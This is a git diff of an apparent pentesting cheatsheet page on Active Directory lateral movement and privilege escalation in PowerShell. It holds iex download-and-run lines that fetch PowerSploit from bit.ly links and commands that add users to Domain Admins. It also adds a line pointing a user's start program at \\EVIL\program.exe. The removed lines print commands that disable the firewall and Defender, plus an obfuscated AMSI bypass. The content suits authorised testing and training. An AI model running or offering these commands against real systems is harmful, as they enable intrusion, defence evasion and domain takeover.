@@ -1,16 +1,15 @@
 ---
 layout: post
-title: TA0008 Lateral Movement - T1210 Top Remote Services Exploits 2019  
-title: Exploitation - AD Privilege Escalation with Powershell
+title: TA0008 Lateral Movement - AD Privilege Escalation with Powershell
 parent: Pentesting
 category: Pentesting
 grand_parent: Cheatsheets
-modified_date: 2021-11-18
+modified_date: 2022-02-11
 permalink: /:categories/:title/
 ---
 <!-- vscode-markdown-toc -->
 * [PRE-REQUISITE: Installing PowerUp and PowerSploit](#PRE-REQUISITE:InstallingPowerUpandPowerSploit)
-* [PRE-REQUISITE: SECURITY TAMPRING](#PRE-REQUISITE:SECURITYTAMPRING)
+* [Tampering the OS to enabling Remote Administration](#TamperingtheOStoenablingRemoteAdministration)
 * [LATERAL MOVEMENT](#LATERALMOVEMENT)
 * [PRIVESC](#PRIVESC)
 * [TOKEN IMPERSONATION](#TOKENIMPERSONATION)
@@ -42,42 +41,19 @@ iex (new-Object Net.WebClient).DownloadString('http://bit.ly/1PdjSHk'); . .\Powe
 iex (new-Object Net.WebClient).DownloadString('http://bit.ly/28RwLgo'); . .\PowerSploit.ps1
 ```
 
-## <a name='PRE-REQUISITE:SECURITYTAMPRING'></a>PRE-REQUISITE: SECURITY TAMPRING
+## <a name='TamperingtheOStoenablingRemoteAdministration'></a>Tampering the OS to enabling Remote Administration
 ```powershell
-# windows firewall showing / disabling config 
-netsh advfirewall set allprofiles state off
-netsh advfirewall show allprofiles
-
-# powershell execution protection bypass
-powershell -ep bypass
-
-# powershell fullLanguage / Constrained language mode
-# https://seyptoo.github.io/clm-applocker/
-$Env:__PSLockdownPolicy
-reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v __PSLockdownPolicy
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v __PSLockdownPolicy /t REG_SZ /d ConstrainedLanguage /f
-/v fDenyTSConnections /t REG_DWORD /d 1 /f
-$ExecutionContext.SessionState.LanguageMode
-$ExecutionContext.SessionState.LanguageMode ConstrainedLanguage
-
 # powershell remoting enable / verify (Needs Admin Access)
 Enable-PSRemoting
+
+# WMI remoting as user authenticated on the Da / execution with DC privileges
+Set-RemoteWMI -UserName johndoe -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
 
 # RDP : enable / disable / check access
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
 reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
 
-# WMI remoting as user authenticated on the Da / execution with DC privileges
-Set-RemoteWMI -UserName johndoe -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
-
-# Windows Defender disabling features
-Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
-Set-MpPreference -DisableIOAVProtection $true
-
-# Windows Defender AMSI Bypass  
-# https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html
-sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```
 
 ## <a name='LATERALMOVEMENT'></a>LATERAL MOVEMENT
@@ -108,6 +84,12 @@ Add-DomainGroupMember -Identity 'Domain Admins' -Members 'jomivz' -Credential $C
 
 # VERIFICATION
 Get-DomainGroupMember -Identity 'Domain Admins'
+
+# set the specified property for the given user identity
+Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
+
+# Set the owner of 'dfm' in the current domain to 'harmj0y'
+Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
 ```
 
 
